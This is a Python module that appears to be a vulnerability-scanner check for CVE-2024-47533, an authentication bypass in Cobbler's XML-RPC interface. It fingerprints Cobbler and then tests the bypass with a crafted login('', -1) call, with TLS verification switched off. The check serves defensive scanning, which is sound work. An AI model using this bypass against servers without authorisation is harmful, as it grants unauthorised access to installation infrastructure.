"""Agent Asteroid implementation for CVE-2024-47533"""

import xmlrpc.client
import ssl
from urllib import parse as urlparse
import datetime
import re

import requests
from requests import exceptions as requests_exceptions
from xml.parsers import expat

from agent import definitions
from agent.asteroid_agent import logger
from agent.exploits import webexploit
from agent import exploits_registry

VULNERABILITY_TITLE = "Cobbler XMLRPC Interface Authentication Bypass"
VULNERABILITY_REFERENCE = "CVE-2024-47533"
VULNERABILITY_DESCRIPTION = """Cobbler, a widely used Linux installation server for network installation environments, contains a critical 
    authentication flaw in versions 3.0.0 to 3.2.2 and 3.3.6. This vulnerability is due to a defective function, 
    bypassing authentication checks for the Cobbler XML-RPC interface."""
RISK_RATING = "CRITICAL"
DEFAULT_TIMEOUT = datetime.timedelta(seconds=30)

JSON_INDICATORS = ['"cobbler_api"', '"mappings"', '"settings"']
XML_INDICATORS = ["<?xml", "<methodCall>", "<methodName>", "<params>"]

accept_pattern = [
    re.compile("|".join(JSON_INDICATORS)),
    re.compile("|".join(XML_INDICATORS)),
]


def _can_bypass_auth(target_url: str) -> bool:
    """Attempt to log in with invalid credentials to verify authentication bypass."""
    try:
        if target_url.startswith("https://") is True:
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE

            transport = xmlrpc.client.SafeTransport(
                use_datetime=True, context=ssl_context
            )
            conn = xmlrpc.client.ServerProxy(target_url, transport=transport)
        else:
            conn = xmlrpc.client.ServerProxy(target_url)

        token = conn.login("", -1)

        logger.info("Authentication bypass succeeded with token: %s", token)
        return True

    except xmlrpc.client.Fault as e:
        logger.error("Authentication attempt resulted in Fault: %s", e)
        return False

    except expat.ExpatError as e:
        logger.error("XML parsing error occurred: %s", str(e))
        return False

    except (
        xmlrpc.client.ProtocolError,
        ssl.SSLError,
        requests_exceptions.RequestException,
    ) as e:
        logger.error("Connection error occurred: %s", str(e))
        return False


@exploits_registry.register
class CVE202447533CobblerExploit(webexploit.WebExploit):
    accept_request = definitions.Request(
        method="GET",
        path="/cobbler_api",
    )

    accept_pattern = accept_pattern

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
        cve_ids=["CVE-2024-47533"],
    )

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """Check if the target is vulnerable to the authentication bypass."""
        vulnerabilities: list[definitions.Vulnerability] = []
        target_endpoint = urlparse.urljoin(target.origin, self.accept_request.path)

        if _can_bypass_auth(target_endpoint) is True:
            vulnerabilities.append(self.create_vulnerability(target))
        else:
            logger.info("Authentication bypass failed.")

        return vulnerabilities

    def accept(self, target: definitions.Target) -> bool:
        """Override the accept method to match JSON or XML response patterns."""
        target_endpoint = urlparse.urljoin(target.origin, self.accept_request.path)

        try:
            req = requests.Request(
                method=self.accept_request.method,
                url=target_endpoint,
            ).prepare()

            if self.accept_request.headers is not None:
                self.accept_request.headers.update(req.headers)
                req.headers = self.accept_request.headers  # type: ignore
            resp = self.session.send(req, timeout=DEFAULT_TIMEOUT.seconds)

        except requests_exceptions.RequestException:
            return False

        for pattern in self.accept_pattern:
            if pattern.search(resp.text) is not None:
                return True
        return False
